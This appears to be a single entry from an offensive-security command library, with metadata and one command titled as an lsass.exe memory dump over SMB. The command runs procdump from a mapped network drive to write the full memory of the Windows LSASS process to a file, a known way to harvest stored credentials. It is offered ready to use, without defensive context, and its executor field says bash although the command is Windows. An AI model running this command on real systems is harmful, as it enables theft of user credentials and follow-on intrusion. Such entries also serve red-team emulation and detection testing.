---
id: f221e361-14df-4479-920d-be7637645650
name: Create memory dump of lsass.exe using SMB method
type: command
executor: bash
data: Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp
output: null
created_at: '2023-04-06T03:56:27.177153+00:00'
updated_at: '2023-04-10T20:37:14.787792+00:00'
---

# Create memory dump of lsass.exe using SMB method

```bash
Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp
```


